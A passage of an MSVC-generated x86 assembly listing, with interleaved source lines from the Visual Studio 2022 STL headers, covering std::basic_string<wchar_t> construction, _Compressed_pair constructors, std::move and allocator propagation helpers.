; 2674 :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Al);

  0002c	c7 45 e8 00 00
	00 00		 mov	 DWORD PTR __Alproxy$[ebp], OFFSET ?_Fake_alloc@std@@3U_Fake_allocator@1@B ; std::_Fake_alloc

; 2675 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);

  00033	8b 4d f8	 mov	 ecx, DWORD PTR __My_data$[ebp]
  00036	51		 push	 ecx
  00037	8b 55 e8	 mov	 edx, DWORD PTR __Alproxy$[ebp]
  0003a	52		 push	 edx
  0003b	8d 4d ff	 lea	 ecx, DWORD PTR __Proxy$[ebp]
  0003e	e8 00 00 00 00	 call	 ??0_Fake_proxy_ptr_impl@std@@QAE@ABU_Fake_allocator@1@ABU_Container_base0@1@@Z ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl

; 2676 : 
; 2677 :         if (_Count <= _Small_string_capacity) {

  00043	83 7d 0c 07	 cmp	 DWORD PTR __Count$[ebp], 7
  00047	77 2f		 ja	 SHORT $LN3@Construct

; 2678 :             _My_data._Mysize = _Count;

  00049	8b 45 f8	 mov	 eax, DWORD PTR __My_data$[ebp]
  0004c	8b 4d 0c	 mov	 ecx, DWORD PTR __Count$[ebp]
  0004f	89 48 10	 mov	 DWORD PTR [eax+16], ecx

; 2679 :             _My_data._Myres  = _Small_string_capacity;

  00052	8b 55 f8	 mov	 edx, DWORD PTR __My_data$[ebp]
  00055	c7 42 14 07 00
	00 00		 mov	 DWORD PTR [edx+20], 7

; 2680 : 
; 2681 :             if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2682 :                 _Traits::assign(_My_data._Bx._Buf, _Count, _Arg);
; 2683 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());
; 2684 :             } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2685 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _Count);
; 2686 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());
; 2687 :             } else { // _Strat == _Construct_strategy::_From_string
; 2688 : #ifdef _INSERT_STRING_ANNOTATION
; 2689 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _Count + 1);
; 2690 : #else // ^^^ _INSERT_STRING_ANNOTATION / !_INSERT_STRING_ANNOTATION vvv
; 2691 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _BUF_SIZE);

  0005c	6a 08		 push	 8
  0005e	8b 45 08	 mov	 eax, DWORD PTR __Arg$[ebp]
  00061	50		 push	 eax
  00062	8b 4d f8	 mov	 ecx, DWORD PTR __My_data$[ebp]
  00065	51		 push	 ecx
  00066	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@_WG@std@@SAPA_WQA_WQB_WI@Z ; std::_Char_traits<wchar_t,unsigned short>::copy
  0006b	83 c4 0c	 add	 esp, 12			; 0000000cH

; 2692 : #endif // ^^^ !_INSERT_STRING_ANNOTATION ^^^
; 2693 :             }
; 2694 : 
; 2695 :             _Proxy._Release();

  0006e	8d 4d ff	 lea	 ecx, DWORD PTR __Proxy$[ebp]
  00071	e8 00 00 00 00	 call	 ?_Release@_Fake_proxy_ptr_impl@std@@QAEXXZ ; std::_Fake_proxy_ptr_impl::_Release

; 2696 :             return;

  00076	eb 77		 jmp	 SHORT $LN1@Construct
$LN3@Construct:

; 2697 :         }
; 2698 : 
; 2699 :         size_type _New_capacity = _Calculate_growth(_Count, _Small_string_capacity, max_size());

  00078	8b 4d f4	 mov	 ecx, DWORD PTR _this$[ebp]
  0007b	e8 00 00 00 00	 call	 ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEIXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
  00080	50		 push	 eax
  00081	6a 07		 push	 7
  00083	8b 55 0c	 mov	 edx, DWORD PTR __Count$[ebp]
  00086	52		 push	 edx
  00087	e8 00 00 00 00	 call	 ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAIIII@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
  0008c	83 c4 0c	 add	 esp, 12			; 0000000cH
  0008f	89 45 f0	 mov	 DWORD PTR __New_capacity$[ebp], eax

; 2700 :         const pointer _New_ptr  = _Allocate_for_capacity(_Al, _New_capacity); // throws

  00092	8d 45 f0	 lea	 eax, DWORD PTR __New_capacity$[ebp]
  00095	50		 push	 eax
  00096	8b 4d e4	 mov	 ecx, DWORD PTR __Al$[ebp]
  00099	51		 push	 ecx
  0009a	e8 00 00 00 00	 call	 ??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPA_WAAV?$allocator@_W@1@AAI@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
  0009f	83 c4 08	 add	 esp, 8
  000a2	89 45 ec	 mov	 DWORD PTR __New_ptr$[ebp], eax

; 2701 :         _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

  000a5	8d 55 ec	 lea	 edx, DWORD PTR __New_ptr$[ebp]
  000a8	52		 push	 edx
  000a9	8b 45 f8	 mov	 eax, DWORD PTR __My_data$[ebp]
  000ac	50		 push	 eax
  000ad	e8 00 00 00 00	 call	 ??$_Construct_in_place@PA_WABQA_W@std@@YAXAAPA_WABQA_W@Z ; std::_Construct_in_place<wchar_t *,wchar_t * const &>
  000b2	83 c4 08	 add	 esp, 8

; 2702 : 
; 2703 :         _My_data._Mysize = _Count;

  000b5	8b 4d f8	 mov	 ecx, DWORD PTR __My_data$[ebp]
  000b8	8b 55 0c	 mov	 edx, DWORD PTR __Count$[ebp]
  000bb	89 51 10	 mov	 DWORD PTR [ecx+16], edx

; 2704 :         _My_data._Myres  = _New_capacity;

  000be	8b 45 f8	 mov	 eax, DWORD PTR __My_data$[ebp]
  000c1	8b 4d f0	 mov	 ecx, DWORD PTR __New_capacity$[ebp]
  000c4	89 48 14	 mov	 DWORD PTR [eax+20], ecx

; 2705 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2706 :             _Traits::assign(_Unfancy(_New_ptr), _Count, _Arg);
; 2707 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());
; 2708 :         } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2709 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count);
; 2710 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());
; 2711 :         } else { // _Strat == _Construct_strategy::_From_string
; 2712 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count + 1);

  000c7	8b 55 0c	 mov	 edx, DWORD PTR __Count$[ebp]
  000ca	83 c2 01	 add	 edx, 1
  000cd	52		 push	 edx
  000ce	8b 45 08	 mov	 eax, DWORD PTR __Arg$[ebp]
  000d1	50		 push	 eax
  000d2	8b 4d ec	 mov	 ecx, DWORD PTR __New_ptr$[ebp]
  000d5	51		 push	 ecx
  000d6	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPA_WPA_W@Z ; std::_Unfancy<wchar_t>
  000db	83 c4 04	 add	 esp, 4
  000de	50		 push	 eax
  000df	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@_WG@std@@SAPA_WQA_WQB_WI@Z ; std::_Char_traits<wchar_t,unsigned short>::copy
  000e4	83 c4 0c	 add	 esp, 12			; 0000000cH

; 2713 :         }
; 2714 : 
; 2715 :         _ASAN_STRING_CREATE(*this);
; 2716 :         _Proxy._Release();

  000e7	8d 4d ff	 lea	 ecx, DWORD PTR __Proxy$[ebp]
  000ea	e8 00 00 00 00	 call	 ?_Release@_Fake_proxy_ptr_impl@std@@QAEXXZ ; std::_Fake_proxy_ptr_impl::_Release
$LN1@Construct:

; 2717 :     }

  000ef	8b e5		 mov	 esp, ebp
  000f1	5d		 pop	 ebp
  000f2	c2 08 00	 ret	 8
??$_Construct@$01PB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXQB_WI@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Construct@$00PB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXQB_WI@Z
_TEXT	SEGMENT
__Al$ = -32						; size = 4
__Alproxy$ = -28					; size = 4
__New_capacity$ = -24					; size = 4
__New_ptr$ = -20					; size = 4
_this$ = -16						; size = 4
__My_data$ = -12					; size = 4
$T1 = -6						; size = 2
$T2 = -4						; size = 2
__Proxy$ = -1						; size = 1
__Arg$ = 8						; size = 4
__Count$ = 12						; size = 4
??$_Construct@$00PB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXQB_WI@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t const *>, COMDAT
; _this$ = ecx

; 2659 :     _CONSTEXPR20 void _Construct(const _Char_or_ptr _Arg, _CRT_GUARDOVERFLOW const size_type _Count) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 20	 sub	 esp, 32			; 00000020H
  00006	89 4d f0	 mov	 DWORD PTR _this$[ebp], ecx

; 2660 :         auto& _My_data = _Mypair._Myval2;

  00009	8b 45 f0	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f4	 mov	 DWORD PTR __My_data$[ebp], eax

; 2661 :         _STL_INTERNAL_CHECK(!_My_data._Large_mode_engaged());
; 2662 : 
; 2663 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2664 :             _STL_INTERNAL_STATIC_ASSERT(is_same_v<_Char_or_ptr, _Elem>);
; 2665 :         } else {
; 2666 :             _STL_INTERNAL_STATIC_ASSERT(_Is_elem_cptr<_Char_or_ptr>::value);
; 2667 :         }
; 2668 : 
; 2669 :         if (_Count > max_size()) {

  0000f	8b 4d f0	 mov	 ecx, DWORD PTR _this$[ebp]
  00012	e8 00 00 00 00	 call	 ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEIXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
  00017	39 45 0c	 cmp	 DWORD PTR __Count$[ebp], eax
  0001a	76 05		 jbe	 SHORT $LN2@Construct

; 2670 :             _Xlen_string(); // result too long

  0001c	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
$LN2@Construct:

; 2671 :         }
; 2672 : 
; 2673 :         auto& _Al       = _Getal();

  00021	8b 4d f0	 mov	 ecx, DWORD PTR _this$[ebp]
  00024	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEAAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  00029	89 45 e0	 mov	 DWORD PTR __Al$[ebp], eax

; 2674 :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Al);

  0002c	c7 45 e4 00 00
	00 00		 mov	 DWORD PTR __Alproxy$[ebp], OFFSET ?_Fake_alloc@std@@3U_Fake_allocator@1@B ; std::_Fake_alloc

; 2675 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);

  00033	8b 4d f4	 mov	 ecx, DWORD PTR __My_data$[ebp]
  00036	51		 push	 ecx
  00037	8b 55 e4	 mov	 edx, DWORD PTR __Alproxy$[ebp]
  0003a	52		 push	 edx
  0003b	8d 4d ff	 lea	 ecx, DWORD PTR __Proxy$[ebp]
  0003e	e8 00 00 00 00	 call	 ??0_Fake_proxy_ptr_impl@std@@QAE@ABU_Fake_allocator@1@ABU_Container_base0@1@@Z ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl

; 2676 : 
; 2677 :         if (_Count <= _Small_string_capacity) {

  00043	83 7d 0c 07	 cmp	 DWORD PTR __Count$[ebp], 7
  00047	77 50		 ja	 SHORT $LN3@Construct

; 2678 :             _My_data._Mysize = _Count;

  00049	8b 45 f4	 mov	 eax, DWORD PTR __My_data$[ebp]
  0004c	8b 4d 0c	 mov	 ecx, DWORD PTR __Count$[ebp]
  0004f	89 48 10	 mov	 DWORD PTR [eax+16], ecx

; 2679 :             _My_data._Myres  = _Small_string_capacity;

  00052	8b 55 f4	 mov	 edx, DWORD PTR __My_data$[ebp]
  00055	c7 42 14 07 00
	00 00		 mov	 DWORD PTR [edx+20], 7

; 2680 : 
; 2681 :             if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2682 :                 _Traits::assign(_My_data._Bx._Buf, _Count, _Arg);
; 2683 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());
; 2684 :             } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2685 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _Count);

  0005c	8b 45 0c	 mov	 eax, DWORD PTR __Count$[ebp]
  0005f	50		 push	 eax
  00060	8b 4d 08	 mov	 ecx, DWORD PTR __Arg$[ebp]
  00063	51		 push	 ecx
  00064	8b 55 f4	 mov	 edx, DWORD PTR __My_data$[ebp]
  00067	52		 push	 edx
  00068	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@_WG@std@@SAPA_WQA_WQB_WI@Z ; std::_Char_traits<wchar_t,unsigned short>::copy
  0006d	83 c4 0c	 add	 esp, 12			; 0000000cH

; 2686 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());

  00070	33 c0		 xor	 eax, eax
  00072	66 89 45 fc	 mov	 WORD PTR $T2[ebp], ax
  00076	8d 4d fc	 lea	 ecx, DWORD PTR $T2[ebp]
  00079	51		 push	 ecx
  0007a	8b 55 0c	 mov	 edx, DWORD PTR __Count$[ebp]
  0007d	8b 45 f4	 mov	 eax, DWORD PTR __My_data$[ebp]
  00080	8d 0c 50	 lea	 ecx, DWORD PTR [eax+edx*2]
  00083	51		 push	 ecx
  00084	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAA_WAB_W@Z ; std::_WChar_traits<wchar_t>::assign
  00089	83 c4 08	 add	 esp, 8

; 2687 :             } else { // _Strat == _Construct_strategy::_From_string
; 2688 : #ifdef _INSERT_STRING_ANNOTATION
; 2689 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _Count + 1);
; 2690 : #else // ^^^ _INSERT_STRING_ANNOTATION / !_INSERT_STRING_ANNOTATION vvv
; 2691 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _BUF_SIZE);
; 2692 : #endif // ^^^ !_INSERT_STRING_ANNOTATION ^^^
; 2693 :             }
; 2694 : 
; 2695 :             _Proxy._Release();

  0008c	8d 4d ff	 lea	 ecx, DWORD PTR __Proxy$[ebp]
  0008f	e8 00 00 00 00	 call	 ?_Release@_Fake_proxy_ptr_impl@std@@QAEXXZ ; std::_Fake_proxy_ptr_impl::_Release

; 2696 :             return;

  00094	e9 99 00 00 00	 jmp	 $LN1@Construct
$LN3@Construct:

; 2697 :         }
; 2698 : 
; 2699 :         size_type _New_capacity = _Calculate_growth(_Count, _Small_string_capacity, max_size());

  00099	8b 4d f0	 mov	 ecx, DWORD PTR _this$[ebp]
  0009c	e8 00 00 00 00	 call	 ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEIXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
  000a1	50		 push	 eax
  000a2	6a 07		 push	 7
  000a4	8b 55 0c	 mov	 edx, DWORD PTR __Count$[ebp]
  000a7	52		 push	 edx
  000a8	e8 00 00 00 00	 call	 ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAIIII@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
  000ad	83 c4 0c	 add	 esp, 12			; 0000000cH
  000b0	89 45 e8	 mov	 DWORD PTR __New_capacity$[ebp], eax

; 2700 :         const pointer _New_ptr  = _Allocate_for_capacity(_Al, _New_capacity); // throws

  000b3	8d 45 e8	 lea	 eax, DWORD PTR __New_capacity$[ebp]
  000b6	50		 push	 eax
  000b7	8b 4d e0	 mov	 ecx, DWORD PTR __Al$[ebp]
  000ba	51		 push	 ecx
  000bb	e8 00 00 00 00	 call	 ??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPA_WAAV?$allocator@_W@1@AAI@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
  000c0	83 c4 08	 add	 esp, 8
  000c3	89 45 ec	 mov	 DWORD PTR __New_ptr$[ebp], eax

; 2701 :         _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

  000c6	8d 55 ec	 lea	 edx, DWORD PTR __New_ptr$[ebp]
  000c9	52		 push	 edx
  000ca	8b 45 f4	 mov	 eax, DWORD PTR __My_data$[ebp]
  000cd	50		 push	 eax
  000ce	e8 00 00 00 00	 call	 ??$_Construct_in_place@PA_WABQA_W@std@@YAXAAPA_WABQA_W@Z ; std::_Construct_in_place<wchar_t *,wchar_t * const &>
  000d3	83 c4 08	 add	 esp, 8

; 2702 : 
; 2703 :         _My_data._Mysize = _Count;

  000d6	8b 4d f4	 mov	 ecx, DWORD PTR __My_data$[ebp]
  000d9	8b 55 0c	 mov	 edx, DWORD PTR __Count$[ebp]
  000dc	89 51 10	 mov	 DWORD PTR [ecx+16], edx

; 2704 :         _My_data._Myres  = _New_capacity;

  000df	8b 45 f4	 mov	 eax, DWORD PTR __My_data$[ebp]
  000e2	8b 4d e8	 mov	 ecx, DWORD PTR __New_capacity$[ebp]
  000e5	89 48 14	 mov	 DWORD PTR [eax+20], ecx

; 2705 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2706 :             _Traits::assign(_Unfancy(_New_ptr), _Count, _Arg);
; 2707 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());
; 2708 :         } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2709 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count);

  000e8	8b 55 0c	 mov	 edx, DWORD PTR __Count$[ebp]
  000eb	52		 push	 edx
  000ec	8b 45 08	 mov	 eax, DWORD PTR __Arg$[ebp]
  000ef	50		 push	 eax
  000f0	8b 4d ec	 mov	 ecx, DWORD PTR __New_ptr$[ebp]
  000f3	51		 push	 ecx
  000f4	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPA_WPA_W@Z ; std::_Unfancy<wchar_t>
  000f9	83 c4 04	 add	 esp, 4
  000fc	50		 push	 eax
  000fd	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@_WG@std@@SAPA_WQA_WQB_WI@Z ; std::_Char_traits<wchar_t,unsigned short>::copy
  00102	83 c4 0c	 add	 esp, 12			; 0000000cH

; 2710 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());

  00105	33 d2		 xor	 edx, edx
  00107	66 89 55 fa	 mov	 WORD PTR $T1[ebp], dx
  0010b	8d 45 fa	 lea	 eax, DWORD PTR $T1[ebp]
  0010e	50		 push	 eax
  0010f	8b 4d ec	 mov	 ecx, DWORD PTR __New_ptr$[ebp]
  00112	51		 push	 ecx
  00113	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPA_WPA_W@Z ; std::_Unfancy<wchar_t>
  00118	83 c4 04	 add	 esp, 4
  0011b	8b 55 0c	 mov	 edx, DWORD PTR __Count$[ebp]
  0011e	8d 04 50	 lea	 eax, DWORD PTR [eax+edx*2]
  00121	50		 push	 eax
  00122	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAA_WAB_W@Z ; std::_WChar_traits<wchar_t>::assign
  00127	83 c4 08	 add	 esp, 8

; 2711 :         } else { // _Strat == _Construct_strategy::_From_string
; 2712 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count + 1);
; 2713 :         }
; 2714 : 
; 2715 :         _ASAN_STRING_CREATE(*this);
; 2716 :         _Proxy._Release();

  0012a	8d 4d ff	 lea	 ecx, DWORD PTR __Proxy$[ebp]
  0012d	e8 00 00 00 00	 call	 ?_Release@_Fake_proxy_ptr_impl@std@@QAEXXZ ; std::_Fake_proxy_ptr_impl::_Release
$LN1@Construct:

; 2717 :     }

  00132	8b e5		 mov	 esp, ebp
  00134	5d		 pop	 ebp
  00135	c2 08 00	 ret	 8
??$_Construct@$00PB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AAEXQB_WI@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t const *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QAE@U_Zero_then_variadic_args_t@1@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___formal$ = 8						; size = 1
??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QAE@U_Zero_then_variadic_args_t@1@@Z PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>, COMDAT
; _this$ = ecx

; 1523 :         : _Ty1(), _Myval2(_STD forward<_Other2>(_Val2)...) {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??0?$allocator@_W@std@@QAE@XZ ; std::allocator<wchar_t>::allocator<wchar_t>
  0000f	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00012	e8 00 00 00 00	 call	 ??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QAE@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
  00017	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001a	8b e5		 mov	 esp, ebp
  0001c	5d		 pop	 ebp
  0001d	c2 04 00	 ret	 4
??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QAE@U_Zero_then_variadic_args_t@1@@Z ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@$$QAV?$allocator@_W@1@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___formal$ = 8						; size = 1
__Val1$ = 12						; size = 4
??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@$$QAV?$allocator@_W@1@@Z PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> >, COMDAT
; _this$ = ecx

; 1528 :         : _Ty1(_STD forward<_Other1>(_Val1)), _Myval2(_STD forward<_Other2>(_Val2)...) {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 0c	 mov	 eax, DWORD PTR __Val1$[ebp]
  0000a	50		 push	 eax
  0000b	e8 00 00 00 00	 call	 ??$forward@V?$allocator@_W@std@@@std@@YA$$QAV?$allocator@_W@0@AAV10@@Z ; std::forward<std::allocator<wchar_t> >
  00010	83 c4 04	 add	 esp, 4
  00013	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00016	e8 00 00 00 00	 call	 ??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QAE@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
  0001b	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001e	8b e5		 mov	 esp, ebp
  00020	5d		 pop	 ebp
  00021	c2 08 00	 ret	 8
??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@$$QAV?$allocator@_W@1@@Z ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$move@AAV?$allocator@_W@std@@@std@@YA$$QAV?$allocator@_W@0@AAV10@@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$move@AAV?$allocator@_W@std@@@std@@YA$$QAV?$allocator@_W@0@AAV10@@Z PROC ; std::move<std::allocator<wchar_t> &>, COMDAT

; 1571 : _NODISCARD _MSVC_INTRINSIC constexpr remove_reference_t<_Ty>&& move(_Ty&& _Arg) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1572 :     return static_cast<remove_reference_t<_Ty>&&>(_Arg);

  00003	8b 45 08	 mov	 eax, DWORD PTR __Arg$[ebp]

; 1573 : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$move@AAV?$allocator@_W@std@@@std@@YA$$QAV?$allocator@_W@0@AAV10@@Z ENDP ; std::move<std::allocator<wchar_t> &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Pocma@V?$allocator@_W@std@@@std@@YAXAAV?$allocator@_W@0@0@Z
_TEXT	SEGMENT
__Left$ = 8						; size = 4
__Right$ = 12						; size = 4
??$_Pocma@V?$allocator@_W@std@@@std@@YAXAAV?$allocator@_W@0@0@Z PROC ; std::_Pocma<std::allocator<wchar_t> >, COMDAT

; 1074 : _CONSTEXPR20 void _Pocma(_Alloc& _Left, _Alloc& _Right) noexcept { // (maybe) propagate on container move assignment

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1075 :     if constexpr (allocator_traits<_Alloc>::propagate_on_container_move_assignment::value) {
; 1076 :         _Left = _STD move(_Right);

  00003	8b 45 0c	 mov	 eax, DWORD PTR __Right$[ebp]
  00006	50		 push	 eax
  00007	e8 00 00 00 00	 call	 ??$move@AAV?$allocator@_W@std@@@std@@YA$$QAV?$allocator@_W@0@AAV10@@Z ; std::move<std::allocator<wchar_t> &>
  0000c	83 c4 04	 add	 esp, 4

; 1077 :     }
; 1078 : }

  0000f	5d		 pop	 ebp
  00010	c3		 ret	 0
??$_Pocma@V?$allocator@_W@std@@@std@@YAXAAV?$allocator@_W@0@0@Z ENDP ; std::_Pocma<std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Pocca@V?$allocator@_W@std@@@std@@YAXAAV?$allocator@_W@0@ABV10@@Z
_TEXT	SEGMENT
__Left$ = 8						; size = 4
__Right$ = 12						; size = 4
??$_Pocca@V?$allocator@_W@std@@@std@@YAXAAV?$allocator@_W@0@ABV10@@Z PROC ; std::_Pocca<std::allocator<wchar_t> >, COMDAT

; 1067 : _CONSTEXPR20 void _Pocca(_Alloc& _Left, const _Alloc& _Right) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1068 :     if constexpr (allocator_traits<_Alloc>::propagate_on_container_copy_assignment::value) {
; 1069 :         _Left = _Right;
; 1070 :     }
; 1071 : }

  00003	5d		 pop	 ebp
  00004	c3		 ret	 0
??$_Pocca@V?$allocator@_W@std@@@std@@YAXAAV?$allocator@_W@0@ABV10@@Z ENDP ; std::_Pocca<std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
